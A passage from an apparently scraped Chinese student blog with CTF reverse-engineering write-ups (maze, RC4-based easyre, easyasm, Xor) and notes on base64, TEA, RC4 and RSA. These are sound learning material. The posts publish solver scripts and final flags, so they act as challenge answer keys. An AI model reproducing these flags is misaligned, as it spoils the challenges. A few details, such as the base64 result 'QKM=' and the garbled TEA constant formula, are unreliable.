数组，估计就在这里面了，我们点进去看，可以看到 map=v2，然后 v2 又等于 num 数组 我点开 num 数组，发现里面有很多数字，并不符合函数中的 16 个循环，这里我很疑惑，然后参考了大佬的 wp 之后才知道我们可以用 ida 的本地调试来获取这 16 次循环的 v2 值，也就是 num 数组的值，操作如下 首先我们开启 debugger 中的 debugger windows，然后找到 createmap 函数的循环，做一个断点 然后按 F9 开始调试，按 F8 一步一步的走，首先程序会弹出来运行，我们要先随便输入一个数字进去才会开始运行 createmap 函数，所以我们先随便输入一个数字，再 F8 开始调试 我们要打开 windows debugger 中的 locals 来查看这个 v2 也就是 num 数组的值，我们要手动让他进行 16 次循环，然后得到 16 个数字，最终得到的数组如下 1num = [0xFFFF, 0x83F7, 0xBBF7, 0xBB17, 0xBB57, 0xB857, 0xBF57, 0xBF17, 0xBFB7, 0xBFB7, 0x8611, 0xF7B5, 0xF7B5, 0x7B4, 0xFF87, 0xFFFF] 不过在这里我想了很久，这怎么就是迷宫了呢，一对 16 进制的数字就是迷宫？不可能！再怎么说也要是 2 进制吧！然后我就用 python 把这 16 个数字全部转为 2 进制，发现真的可以，的出来的结果应该就是迷宫了！ 不过，这倒数第三行少了几个数字，根据经验，在前面补 0 就行了，让它对齐，不过有的大佬的 wp 脚本跑出来前面就有 0，挺懵逼的我，我的只能自己补？ 最后一步就开始走迷宫吧！咦？不对啊，wasd 走出来的结果根本不对！噢，原来是我忽略了一开始的 check 函数，我返回去看，发现这里面有这个迷宫真正的走法 不难看出，[13],[0] 这个位置就是起点了，终点就是 [13],[15] 了，这里有 l、k、h、j 四个字母，估计就是方向键了，也不难得出，k 是向上走，h 是向左走，j 是向下走，那 l 就是向右走了 最后依照这个路径走完迷宫就可以了，不过要记住是要走最短的路径噢！ （一开始我直接提交的路径，一直是 sorrrrrrrry~ 仔细看才发现它非要我们包上 flag {}，不过之前用 wasd 的时候也没包 flag… 挺无语的哈哈哈哈哈） 最终 flag：flag{llllkkkhhhkkkkkkkkklllljjjjllljjljjjjjjjlllkkkklljjjl}","tags":["reverse"],"categories":["wp"]},{"title":"2019华南师大CTF新生赛maze","path":"/2022/04/14/2019华南师大CTF新生赛maze/","content":"这道题是本周的任务之一，是一道迷宫题，因为是华南师大的赛题我一开始以为很难，抱着试试的心态去做，没想到并没有我想象中的难，挺简单的哈哈哈哈，但可能有一点取巧了 首先检查程序，是一个 32 位的无壳程序，然后就是丢到 ida pro 中看主函数，然后可以看到以下这部分 它的关键部分就是我圈起来的这一部分，也就是这个 check 函数，同时它有一个条件是 flag 的长度要为 24 位，也就是说走出这个迷宫的路径就是 24，现在我们先查看一下 check 函数 12345678910111213141516171819202122232425262728293031323334353637bool __cdecl check(char *flag)&#123; char *v1; // eax int v2; // eax char *cur; // [esp+Ch] [ebp-4h] cur = &amp;maze[14]; while ( *flag &amp;&amp; *cur != 42 ) &#123; v1 = flag++; v2 = *v1; if ( v2 == 100 ) &#123; ++cur; &#125; else if ( v2 &gt; 100 ) &#123; if ( v2 == 115 ) &#123; cur += 13; &#125; else &#123; if ( v2 != 119 ) return 0; cur -= 13; &#125; &#125; else &#123; if ( v2 != 97 ) return 0; --cur; &#125; &#125; return *cur == 35;&#125; 其中有一个 maze 数组，这应该就是我们的迷宫图了，我们点进去看，可以看到迷宫的组成 虽然有了它的组成部分，但是我并不知道它的格式是什么，从 check 函数来看，因为 @是第 14 位，所以我可以知道 @就是起点，终点都不用想，肯定是 #了，那么现在问题的关键就是要知道这个迷宫的格式，他肯定是个矩阵型的，这才符合一个标准的迷宫图形 这里我想到一个办法，就是把它复制粘贴到 word 文档中，看它有多少个字符，看会不会符合一个矩阵型，然后发现它一共有 169 个字符，我就想这不就是 13 的平方吗？于是我就赶紧操作起来，把它分为了一个 13×13 的迷宫，这就是它的格式了（也是我取巧的部分吧） 弄完之后就是长这个样子 然后我就以 @为起点，# 为终点来走迷宫（注意要是最短路径），然后走出了一个长度为 24 的路径，用 WASD 来表示上下左右，点开程序输入进去，发现是对的。不过这里有一点要注意一下，就是迷宫的每一步都要对齐，不要一下子就飘到另一个地方了，我一开始因为这样而错了好几次。 最后的结果如下 所以 flag 就是：flag{sssssdsssddsdddwwdwwaaaw}","tags":["reverse"],"categories":["wp"]},{"title":"深入了解base64编码","path":"/2022/04/13/深入了解base64编码/","content":"平时 base64 的题目也有不少，生活中也是很常见的，但是每次遇到 base64 都是在网上找解码器直接一键解码，从没有去了解过它的具体实现过程，因为这周我们小组的任务要求深入了解 base64，才去真正的了解了 base64 # base64 是什么 base64 是一种从二进制到文本的编码方式，而且编码后的结果只包含 ASCII 基础字符，值得注意的是，base64 并不能算是加密算法，只是一种编码方式，算法什么的都是公开的，所以不能依赖它来进行加密 为什么要叫做 base64 呢？是因为它的输出字符串是由 64 个可打印字符组成的，下面是它的索引表（来源于百度百科） 索引 对应字符 索引 对应字符 索引 对应字符 索引 对应字符 0 A 17 R 34 i 51 z 1 B 18 S 35 j 52 0 2 C 19 T 36 k 53 1 3 D 20 U 37 l 54 2 4 E 21 V 38 m 55 3 5 F 22 W 39 n 56 4 6 G 23 X 40 o 57 5 7 H 24 Y 41 p 58 6 8 I 25 Z 42 q 59 7 9 J 26 a 43 r 60 8 10 K 27 b 44 s 61 9 11 L 28 c 45 t 62 + 12 M 29 d 46 u 63 / 13 N 30 e 47 v 14 O 31 f 48 w 15 P 32 g 49 x 16 Q 33 h 50 y 其实也就是我们平常在做题过程中可以看见的一个数组”ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/“ 废话不多说，直接开始了解它的编码过程吧 # 编码过程 # 字符串分组 将待转换的字符串每三个字节分为一组，每个字节占 8bit，一共是 24 个字节 这里我以我名字的首字母大写 TCH 为例，T、C、H 在 ASCII 码表中的位置分别是 84，67，72，而这三个数字的二进制码又分别为 1010100，1000011，1001000，不足八位的就在前面补 0，也就是 01010100，01000011，01001000，那么第一步就完成了 # 二进制码分组 以上我们已经得到了一个 3×8=24 位的二进制码，我们还需要把这 24 位二进制码分为四组 6 位二进制码，也就是 010101，000100，001101，001000，就是从前面开始六位六位的去划分就可以了 # 添 0 得到 4 字节 在这一步我们将以上得到的四组六位二进制码再在他们每组的前面添加两个 0，也就是 00010101，00000100，00001101，00001000，这样就得到了四组八位二进制码，也就得到了四个字节 # 根据索引表得到具体的值 将以上得到的四个二进制数在我们的 base64 索引表中找到具体的值，其中 00010101=21=V，00000100=4=E，00001101=13=N，00001000=8=I 所以，TCH 最终的编码结果就是 VENI 光是文字说明可能不是很形象，这里用一个表格来呈现一下可能会更清晰 这就是总体过程 # 位数不足情况 有时候会有一些特殊情况，因为我举得例子恰好是三个字节，那有时候不足三个字节呢？那该如何处理？其实很简单，如果是两个字节，就一共有 16 个二进制位，还是按照规则进行分组，每六个一组的话，第三组会缺少 2 位，用 0 补齐即可得到三个 base64 编码，第四组完全没有数据的话就用”=“来补上，所以打个比方 “BC” 转换之后就是 “QKM=” # 注意事项 大多数编码都是由字符串转化成二进制的过程，而 Base64 的编码则是从二进制转换为字符串。与常规恰恰相反， Base64 编码主要用在传输、存储、表示二进制领域，不能算得上加密，只是无法直接看到明文。也可以通过打乱 Base64 编码来进行加密，在我之前刷题的过程中就有遇到过 base64 换表的题，就是将 base64 索引表的顺序打乱从而形成一个新表，再来进行编码的过程 # 换表情况 在注意事项中有提到换表的情况，其实这个不难理解，我们正常的表是这样的”ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/“，我们可以随意的把它换成别的顺序，只要是 64 位就可以了，比如”123456789abcdefghijklmnopqrstuvwxyz+/ABCDEFGHIJKLMNOPQRSTUVWXYZ“，那么从 0 到 63 就是从 1 到 Z 的一个新表，中间的过程是一样的，只是最后索引部分需要从这个新表中进行索引即可，这就是换表的情况，因为之前刷题的时候遇到过所以这里就着重写一下，以后遇到还可以再看看","tags":["算法"],"categories":["笔记"]},{"title":"DASCTF×SU2022-easyre","path":"/2022/04/03/DASCTF×SU2022-easyre/","content":"# 思路 这个程序是一个 32 位的程序，并且是带了 asp 的壳，我还不会手动去壳，所以就用工具把壳去掉了，下面看到主函数 在点进去第一个函数之后就很明显，这是个 RC4 算法的题，而且不难看出，这个 dword_492040 [i] 就是 S 表，在这我将它的名字改位 S [i] 在看第二个函数，也很明显，这个 v1 应该就是密钥了，用 v1 来填充 k 表，但是这里的填充规则是有些改动的，我们需要知道 sub_41A038 的值才能进行计算，我们先不管这个 要注意的是，v1 密钥 “123456” 是字符串的形式，但我们填表是要用十进制的形式的，将 “123456” 转化为十进制之后是这样的 第三个函数是对 S 表的初始置换 第四个函数是计算新 K 表也就是密钥流，用来与明文进行异或运算的，这个 dword_492940 数组就是新 K 表 现在我们退出去，第一行有一个 v3，这个就是我们刚才需要知道的一个值，那它等于多少呢？根据逻辑关系，v3 的值是四个函数下面的 for 循环的限制条件（v3 也是明文的长度），也就是最后一步，即异或运算的循环次数，这个循环次数取决于 v2 数组的长度，而 v2 的长度是 42，所以 v3=42 在最后的 for 循环中，密文也就是 v2，等于 K 表的低位与明文进行异或然后再加 71，那么我们的脚本写出来就是把密文减 71 再与 K 表异或就是我们的明文了 # 脚本 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109#include&lt;iostream&gt;#include&lt;stdint.h&gt;using namespace std;int s[256];char t[256];int k[50];void swap(int* a, int* b)&#123;\tuint8_t tmp;\ttmp = *a;\t*a = *b;\t*b = tmp;&#125;void Rc4_Init(uint8_t* key, uint32_t klen)&#123;\tint i, j;\tfor (i = 0; i &lt; 256; i++)\t&#123; s[i] = i; t[i] = key[i % klen];\t&#125;\tj = 0;\tfor (i = 0; i &lt; 256; i++)\t&#123; j = (j + s[i] + t[i]) % 256; swap(&amp;s[i], &amp;s[j]); //交换的函数(可以套用这个模板)\t&#125;&#125; void __cdecl sub_401619()&#123;\tint v3; // [esp+10h] [ebp-10h]\tint v4; // [esp+14h] [ebp-Ch]\tint v5; // [esp+18h] [ebp-8h]\tint i; // [esp+1Ch] [ebp-4h]\tint a2 = 42;\tv4 = 0;\tv5 = 0;\tfor (i = 0; a2--; k[v4++] = s[(s[v5] + s[i]) % 256])\t&#123; i = (i + 1) % 256; v5 = (v5 + s[i]) % 256; v3 = s[i] + 66; s[i] = s[v5] - 33; s[i] ^= 2u; s[v5] = 5 * v3; s[v5] = s[i] - 10; s[v5] += s[i]; s[i] -= 18;\t&#125; //加密部分的函数&#125;int main()&#123;\tuint8_t v2[42];\tuint8_t ket[7] = &#123;49,50,51,52,53,54&#125;;\tRc4_Init(ket, 6);\tsub_401619();\tv2[0] = -61;\tv2[1] = -128;\tv2[2] = -43;\tv2[3] = -14;\tv2[4] = -101;\tv2[5] = 48;\tv2[6] = 11;\tv2[7] = -76;\tv2[8] = 85;\tv2[9] = -34;\tv2[10] = 34;\tv2[11] = -125;\tv2[12] = 47;\tv2[13] = -105;\tv2[14] = -72;\tv2[15] = 32;\tv2[16] = 29;\tv2[17] = 116;\tv2[18] = -47;\tv2[19] = 1;\tv2[20] = 115;\tv2[21] = 26;\tv2[22] = -78;\tv2[23] = -56;\tv2[24] = -59;\tv2[25] = 116;\tv2[26] = -64;\tv2[27] = 91;\tv2[28] = -9;\tv2[29] = 15;\tv2[30] = -45;\tv2[31] = 1;\tv2[32] = 85;\tv2[33] = -78;\tv2[34] = -92;\tv2[35] = -82;\tv2[36] = 123;\tv2[37] = -84;\tv2[38] = 92;\tv2[39] = 86;\tv2[40] = -68;\tv2[41] = 35;\tfor (int i = 0; i &lt; 42; i++) v2[i] = ((v2[i] - 71) ^ (k[i] &amp; 0xff));\tprintf(&quot;%s&quot;,v2); return 0; &#125;//DASCTF&#123;Welc0me-t0-j01n-SU-l0ve-suyug1eg1e&#125; 题目来源：DASCTF × SU 2022 —— easyre","tags":["reverse","RC4"],"categories":["wp"]},{"title":"TEA算法","path":"/2022/04/01/TEA算法/","content":"# TEA 简介 TEA（Tiny Encryption Algorithm）是一种分组加密算法，TEA 算法最初是由剑桥计算机实验室的 David Wheeler 和 Roger Needham 在 1994 年设计的 TEA 算法使用 64 位的明文分组和 128 位的密钥，它使用 Feistel 分组加密框架，需要进行 64 轮迭代，尽管作者认为 32 轮已经足够了。该算法使用了一个神秘常数 δ 作为倍数，它来源于黄金比率，以保证每一轮加密都不相同。但 δ 的精确值似乎并不重要，这里 TEA 把它定义为 δ=「(√5 - 1) 231」（也就是程序中的 0×9E3779B9） 之后 TEA 算法被发现存在缺陷，作为回应，设计者提出了一个 TEA 的升级版本 ——XTEA（有时也被称为 “tean”）。XTEA 跟 TEA 使用了相同的简单运算，但它采用了截然不同的顺序，为了阻止密钥表攻击，四个子密钥（在加密过程中，原 128 位的密钥被拆分为 4 个 32 位的子密钥）采用了一种不太正规的方式进行混合，但速度更慢了 # 加密解密过程 这里有一个大佬写的 c 语言脚本可以实现 TEA 加密，我们以这个脚本来分析一下它的加解密过程 # 加密过程 # 32 位无符号整数 整型的每一种都有无符号（unsigned）和有符号（signed）两种类型（float 和 double 总是带符号），在默认情况下声明的整型变量都是有符号类型，如果要声明其不是无符号，则需要在类型前加上 unsigned。这两者的区别就是，无符号类型可以保存两倍于有符号类型的正整数数据，比如 16 位系统中 int 能储存的数据范围为 - 32768~32767，而无符号的范围则是 0 ~ 65535. 而在我们的脚本中，uint32_t 就是定义其为 32 位无符号整数，关于其还要注意，当某个数据不可能为负数的时候我们就可以这样定义：uint32_t，unsigned char, unsigned int, size_t, uint64_t, unsigned long int，也可以这么理解，当有些数据我们不知道是正是负时，就不能用以上定义. 此外，在运算两个 32 位无符号整数时要注意它会不会超过它的最大值，比如： 123uint32_t a,b,c;uint64_t s;s = a * b + c; 在这个运算中 a*b 可能会超过 uint32_t 的最大值，所以我们要这样写： 1s = （(uint64_t)a )* b + c； 我们现在再来看脚本： 123456789101112131415161718192021222324252627#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;//加密函数void encrypt(uint32_t* v, uint32_t* k)&#123; uint32_t v0=v[0], v1=v[1], sum=0, i; /* set up */ uint32_t delta=0x9e3779b9; /* a key schedule constant */ uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3]; /* cache key */ for (i=0; i &lt; 32; i++)\t&#123; /* basic cycle start */ sum += delta; v0 += ((v1&lt;&lt;4) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;5) + k1); v1 += ((v0&lt;&lt;4) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;5) + k3); &#125; /* end cycle */ v[0]=v0; v[1]=v1;&#125;int main() &#123; uint32_t v[2]=&#123;1,2&#125;,k[4]=&#123;2,2,3,4&#125;; // v为要加密的数据是两个32位无符号整数 // k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位 printf(&quot;加密前原始数据：%u %u &quot;,v[0],v[1]); encrypt(v, k); printf(&quot;加密后的数据：%u %u &quot;,v[0],v[1]); return 0;&#125; 我们可以看到，v 就是要加密的数据，是两个 32 位无符号整数，而 k 是加密解密的密钥，为 4 个 32 位无符号整数，即密钥长度为 128 位，这个 delta 是为了保证每一轮加密都不同，一般都是 0x9e3779b9，但有的也不一定是这个，这个要根据情况而定 加密过程其实很好理解，就不多解释了，这个是 TEA 算法家族中最简单的，因为还有很多魔改 TEA 也就是 XTEA、XXTEA，我哭 # 解密过程 12345678910111213void decrypt(uint32_t* v, uint32_t* k)&#123; uint32_t v0=v[0], v1=v[1], sum=0xC6EF3720, i; /* set up */ uint32_t delta=0x9e3779b9; /* a key schedule constant */ uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3]; /* cache key */ for (i=0; i&lt;32; i++)\t&#123; /* basic cycle start */ v1 -= ((v0&lt;&lt;4) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;5) + k3); v0 -= ((v1&lt;&lt;4) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;5) + k1); sum -= delta; &#125; /* end cycle */ v[0]=v0; v[1]=v1;&#125; （未完持续）","tags":["算法"],"categories":["笔记"]},{"title":"RC4算法","path":"/2022/03/31/RC4算法/","content":"# RC4 算法的基本原理： RC4 属于对称密码算法中的流密码加密算法，它的密钥长度是可变的，它以一个足够大的表 S 为基础，对表进行非线性变换，产生密钥流 对称密码：加密和解密使用的是同一个密钥，即明文和密钥异或生成密文 流密码：逐字节，一个字节一个字节进行加密，和它对应的是块加密（分组加密），比较有代表性的就是 DES 加密算法（我还没学） 既然是逐字节进行加密，那么它的重点就是密钥了，RC4 算法是一个密钥长度可变的加密算法，也就是说它的密钥可以是任意长度，而这个密钥流就是以一个足够大的 S 表为基础，并对其进行非线性变换产生的 # 加密过程 # 初始化 S 表 对 S 表进行线性填充，一般为 256 个字节 用种子密钥填充另一个 256 字节的 K 表 用 K 表对 S 表进行初始置换 # 密钥流的生成 为每个待加密的字节生成一个伪随机数，用来进行异或运算（表 S 一旦生成，种子密钥就不再被使用） # 初始化 S 表： 第一步，我们首先对 S 表进行一个升序填充，从 0 到 255，也就是 S [0]=0，S [1]=1，S [2]=2，直到 S [255]=255；第二步要用到密钥，也就是种子密钥，用种子密钥来填充另一个 256 字节的 K 表，这个密钥的长度一般不会很长，比如我们现在密钥是 3，4，5，那么我们就用 3，4，5 来循环填充这个 K 表一直到 K [255]；第三步用 K 表对 S 表进行初始置换，也就是从 S [0] 开始到 S [255]，对每个 S [i] 根据 K [i] 确定的一个方案，将 S [i] 置换为 S 中的另一个字节，对于这个初始置换，我们举一个例子 S 表： 0 1 2 3 4 5 6 S[0] S[1] S[2] S[3] S[4] S[5] S[6] K 表： 3 4 5 3 4 5 3 K[0] K[1] K[2] K[3] K[4] K[5] K[6] 置换： 1234j=0;for i=0 to 255 do\tj=(j+S[i]+K[i]) mod 256; //实际上只要除以7就可以了，因为我们举的例子是7位的表\tSwap(S[i], S[j]); 我们取 i，j 都为 0，从 0 到 255 开始查值，然后通过第三行 j 的计算得到一个下标，那么我们就把当前操作位的值和这一位的值进行一个置换，比如第 0 位的计算过程是这样的： 1j=(0+S[0]+K[0]) mod 7 = 3 mod 7 = 3 所以我们将第 0 位的值和第三位的值进行一个交换，那么从 0 到 6 每个值都进行变换之后我们就得到了一个新的 S 表： 3 0 1 4 5 2 6 S[0] S[1] S[2] S[3] S[4] S[5] S[6] # 密钥流的生成： 因为是流密码，所以我们要为每一个待加密的字节生成一个用来与之进行异或运算的伪随机值，这个数值也是从 S 表中获取，所以我们要做的就是找到这个随机数的下标，也就是这个随机数是 S 几，下面是生成密钥流的操作： 1234567i,j=0;for r=0 to len do //r为明文长度，r字节\ti=(i+1) mod 256;\tj=(j+S[i]) mod 256;\tswap(S[i], S[j]);\tt=(S[i]+S[j]) mod 256;\tK[r]=S[t]; 这个 K 就是伪随机数值所组成的一个数组，t 是 S 的下标，我们就是要找到这个下标也就是这个 t，那么这个 t 又是通过 S [i] 和 S [j] 来进行计算，然后 i 和 j 又是通过第 3、4 行来计算，即： 123i=(i+1) mod 7 = 0+1 mod 7 = 1；j=(j+S[i]) mod 7 = 0+S[1] mod 7 = 0+0 mod 7 = 0；swap(S[0], S[1]); 需要注意的是，在每次算完 i 和 j 之后都会有两个值的交换，也就是说每一轮之后这个 S 表都是变了的，都是不一样的，然后计算 t 后将对应下标的值传给 K 表： 123t = S[0]+S[1] mod 7 = 3;S[3] = 4;K[0] = S[3] = 4; 那么和 S [0] 进行异或运算的伪随机数就是这个 K [0]，以此类推，最终得到密文 # 总结： 以一个 256 字节的 S 表为基础，使用密钥填充一个 K 表，再用这个 K 表对 S 表进行初始置换，密钥不同生成的 S 表也不同，然后我们要取明文的长度，明文多长，密钥流就多长，通过运算生成密钥流，这个运算过程就是一个找下标 t 的过程，而每一次的随机数的生成都会对 S 表（此时的 S 表是明文长度的 S 表）进行两个数字的置换，所以每一轮的 S 表都是不同的，最后我们拿这个密钥流也就是 K 表，与明文一一对应地进行异或运算，得出密文，这就是总体的过程 实战可以看这篇博客：DASCTF×SU2022-easyre | ChengHan’s Blog (tchdv.cn) 参考视频 ——RC4 加密算法 | 流密码 | 对称密码 | 密码学 | 信息安全_哔哩哔哩_bilibili","tags":["算法"],"categories":["笔记"]},{"title":"RSA算法","path":"/2022/03/25/RSA算法/","content":"# RSA 加密 密文=明文EmodN密文 = 明文^E mod N 密文=明文EmodN E 为 encryption (加密) 的缩写 # RSA 解密 明文=密文DmodN明文 = 密文^D mod N 明文=密文DmodN D 为 decryption (解密) 的缩写 # 生成密钥对 密钥对为（E, D, N） 要生成密钥对，还要分别求出 N, L, E, D # 求 N N=p×qN = p × q N=p×q 其中 p 和 q 是两个质数（素数），这两个质数不能太小，否则容易被破解 质数又称素数，一个大于 1 的自然数，除了 1 和它自身外，不能被其他自然数整除的数叫做质数 # 求 L L=(p−1)×(q−1)L = (p-1) × (q-1) L=(p−1)×(q−1) L=lcm(p−1,q−1)L = lcm(p-1, q-1) L=lcm(p−1,q−1) 其中 L 是 p-1 和 q-1 的最小公倍数，lcm 就是最小公倍数的意思 L 是一个中间变量，我们需要求出 L 以求出 E # 求 E 1&lt;E&lt;L1&lt;E&lt;L 1&lt;E&lt;L gcd(E,L)=1gcd(E, L) = 1 gcd(E,L)=1 E 是一个比 1 大但是比 L 即 lcm 小的数，gcd 就是最大公约数的意思 # 求 D 1&lt;D&lt;L1&lt;D&lt;L 1&lt;D&lt;L E×DmodL=1E × D mod L = 1 E×DmodL=1 # 实战： 了解了原理之后我们来实战一下 这有一道题 很明显，其中 E 指数 = 65537，N = 103461035900816914121390101299049044413950405173712170434161686539878160984549 而 ad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35 则是 16 进制密文 我们可以通过分解 N 来求 p 和 q，可以用 http://www.factordb.com/ 这个网站来分解，分解得到 12p = 282164587459512124844245113950593348271q = 366669102002966856876605669837014229419 这样我们就可以通过 p-1 和 q-1 来求 L ，但 L 只是一个中间变量，我们现在可以不求出来，最后用脚本代入即可，求出 L 之后就可以求出 D，求出 D 之后就可以解出来了 明文=密文DmodN明文 = 密文^D mod N 明文=密文DmodN # 脚本如下 1234567891011121314import gmpy2import binasciip = 282164587459512124844245113950593348271q = 366669102002966856876605669837014229419E = 65537miwen = 0xad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35N = p * qD = gmpy2.invert(E, (p-1) * (q-1))mingwen = gmpy2.powmod(miwen, D, N)print(binascii.unhexlify(hex(mingwen)[2:]).decode(encoding=&quot;utf-8&quot;)) 解出 flag 为：suctf{Pwn_@_hundred_years} 题目来源：BUUCTF 在线评测 (buuoj.cn) 参考博客：(25 条消息) 带你彻底理解 RSA 算法原理_小宝一号的博客 - CSDN 博客_rsa 是哪个国家","tags":["算法"],"categories":["笔记"]},{"title":"easyasm","path":"/2022/03/15/easyasm/","content":"# 汇编语言 这个题是寒假的时候一个叫 Hgame 的比赛的题，当时也做了一下没看懂，开学之后学了点汇编之后就勉强能看懂了，勉强弄懂了它的逻辑，先看看它的汇编语言吧： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121seg001:0000 seg001 segment byte public &#x27;UNK&#x27; use16seg001:0000 assume cs:seg001seg001:0000 assume es:nothing, ss:nothing, ds:dseg, fs:nothing, gs:nothingseg001:0000 db 91hseg001:0001 db 61h ; aseg001:0002 db 1seg001:0003 db 0C1hseg001:0004 db 41h ; Aseg001:0005 db 0A0hseg001:0006 db 60h ; `seg001:0007 db 41h ; Aseg001:0008 db 0D1hseg001:0009 db 21h ; !seg001:000A db 14hseg001:000B db 0C1hseg001:000C db 41h ; Aseg001:000D db 0E2hseg001:000E db 50h ; Pseg001:000F db 0E1hseg001:0010 db 0E2hseg001:0011 db 54h ; Tseg001:0012 db 20hseg001:0013 db 0C1hseg001:0014 db 0E2hseg001:0015 db 60h ; `seg001:0016 db 14hseg001:0017 db 30h ; 0seg001:0018 db 0D1hseg001:0019 db 51h ; Qseg001:001A db 0C0hseg001:001B db 17hseg001:001C db 0seg001:001D db 0seg001:001E db 0seg001:001F db 0seg001:001F seg001 endsseg001:001Fseg002:0000 ; ===========================================================================seg002:0000seg002:0000 ; Segment type: Uninitializedseg002:0000 seg002 segment byte stack &#x27;STACK&#x27; use16seg002:0000 assume cs:seg002seg002:0000 assume es:nothing, ss:nothing, ds:dseg, fs:nothing, gs:nothingseg002:0000 db 80h dup(0)seg002:0000 seg002 endsseg002:0000seg003:0000 ; ===========================================================================seg003:0000seg003:0000 ; Segment type: Pure codeseg003:0000 seg003 segment byte public &#x27;CODE&#x27; use16seg003:0000 assume cs:seg003seg003:0000 assume es:nothing, ss:seg002, ds:nothing, fs:nothing, gs:nothingseg003:0000seg003:0000 ; =============== S U B R O U T I N E =======================================seg003:0000seg003:0000 ; Attributes: noreturnseg003:0000seg003:0000 public startseg003:0000 start proc nearseg003:0000 mov ax, seg dsegseg003:0003 mov ds, axseg003:0005 assume ds:dsegseg003:0005 mov ax, seg seg001seg003:0008 mov es, axseg003:000A assume es:seg001seg003:000A mov si, 0seg003:000Dseg003:000D loc_100DD: ; CODE XREF: start+38↓jseg003:000D cmp si, 1Chseg003:0010 jz short loc_10135seg003:0012 xor ax, axseg003:0014 mov al, [si]seg003:0016 shl al, 1seg003:0018 shl al, 1seg003:001A shl al, 1seg003:001C shl al, 1seg003:001E push axseg003:001F xor ax, axseg003:0021 mov al, [si]seg003:0023 shr al, 1seg003:0025 shr al, 1seg003:0027 shr al, 1seg003:0029 shr al, 1seg003:002B pop bxseg003:002C add ax, bxseg003:002E xor ax, 17hseg003:0031 add si, 1seg003:0034 cmp al, es:[si-1]seg003:0038 jz short loc_100DDseg003:003A mov ax, 0B800hseg003:003D mov es, axseg003:003F assume es:nothingseg003:003F mov byte ptr es:0, 77h ; &#x27;w&#x27;seg003:0045 mov byte ptr es:2, 72h ; &#x27;r&#x27;seg003:004B mov byte ptr es:4, 6Fh ; &#x27;o&#x27;seg003:0051 mov byte ptr es:6, 6Eh ; &#x27;n&#x27;seg003:0057 mov byte ptr es:8, 67h ; &#x27;g&#x27;seg003:005D mov byte ptr es:0Ah, 21h ; &#x27;!&#x27;seg003:0063seg003:0063 loc_10133: ; CODE XREF: start:loc_10133↓jseg003:0063 jmp short loc_10133seg003:0065 ; ---------------------------------------------------------------------------seg003:0065seg003:0065 loc_10135: ; CODE XREF: start+10↑jseg003:0065 mov ax, 0B800hseg003:0068 mov es, axseg003:006A mov byte ptr es:0, 72h ; &#x27;r&#x27;seg003:0070 mov byte ptr es:2, 69h ; &#x27;i&#x27;seg003:0076 mov byte ptr es:4, 67h ; &#x27;g&#x27;seg003:007C mov byte ptr es:6, 68h ; &#x27;h&#x27;seg003:0082 mov byte ptr es:8, 74h ; &#x27;t&#x27;seg003:0088 mov byte ptr es:0Ah, 21h ; &#x27;!&#x27;seg003:008Eseg003:008E loc_1015E: ; CODE XREF: start:loc_1015E↓jseg003:008E jmp short loc_1015Eseg003:008E start endpseg003:008Eseg003:008E seg003 endsseg003:008Eseg003:008Eseg003:008E end start # 思路 它的逻辑是将输入的字符左移四位再右移四位再相加，然后再将每一位与 0x17 异或运算，如果每一位结果都等于 seg001 中的值对应相等就输出 right，那么我们就逆着来写个脚本 # 脚本 # 问题 一开始我是用 python 写的，但是一直输出不了正确答案，我很疑惑，然后看了大佬写的脚本之后发现他们在第八行，在左移的时候给 xor 还与上了一个 0x0f（还有大佬与上的是 0xff），这样之后结果就是对的，这里我还是没搞懂 123456789list = [0x91, 0x61, 0x1, 0xc1, 0x41, 0xa0, 0x60, 0x41, 0xd1, 0x21, 0x14, 0xc1, 0x41, 0xe2 0x50, 0xe1, 0xe2, 0x54, 0x20, 0xc1, 0xe2, 0x60, 0x14, 0x30, 0xd1, 0x51, 0xc0, 0x17]flag = &#x27;&#x27;for i in list: xor = i ^ 0x17 flag += chr((xor &gt;&gt; 4) + ((xor &amp; 0x0f) &lt;&lt; 4))print(flag) 然后我同学就告诉我用 c 语言来写脚本，发现 c 语言可以不用这样 12345678910111213141516#include&lt;stdio.h&gt;int main()&#123;\tint a[28] = &#123;0x91,0x61,0x1,0xc1,0x41,0xa0,0x60,0x41,0xd1,0x21,0x14,0xc1,0x41,0xe2,0x50,0xe1,0xe2,0x54,0x20,0xc1,0xe2,0x60,0x14,0x30,0xd1,0x51,0xc0,0x17&#125;;\tfor(int i=0;i&lt;28;i++)\t&#123; a[i] = a[i] ^ 23;\t&#125;\tfor(int i=0;i&lt;28;i++)\t&#123; a[i] = (a[i]&gt;&gt;4)+ (a[i]&lt;&lt;4); printf(&quot;%c&quot;,a[i]); &#125;\treturn 0;&#125; 这里要注意一个细节，就是在程序中，我们的值是先进行左移再进行右移的，所以我们在写脚本的时候要注意，要先右移再左移，这样的结果才是对的，一开始我没注意，我同学告诉我之后我才知道这个细节，学到了 最后得到 flag：hgame{welc0me_to_4sm_w0rld} 题目来源：Hgame ctf 2022 – easyasm","tags":["reverse"],"categories":["wp"]},{"title":"Xor","path":"/2022/03/14/Xor/","content":"查壳后发现无壳且是 32 位程序，所以我们直接用 32 位 IDA PRO 打开即可，还是一样找主函数，但是当我 F5 反汇编的之后却发现无法反汇编 在这里我卡住了，于是我上网查了一下别的大佬写的 wp 我们跟踪一下这个地址，跳到 00401095 这个地址之后，我们再按 F5 反汇编，然后再重新进入 main 函数，就可以反汇编了 这下思路就很清晰了，逻辑很简单，就直接上脚本吧 123456a = &#x27;MSAWB~FXZ:J:`tQJ&quot;N@ bpdd&#125;8g&#x27;b = &#x27;&#x27;for i in range(len(a)): b += chr (i ^ 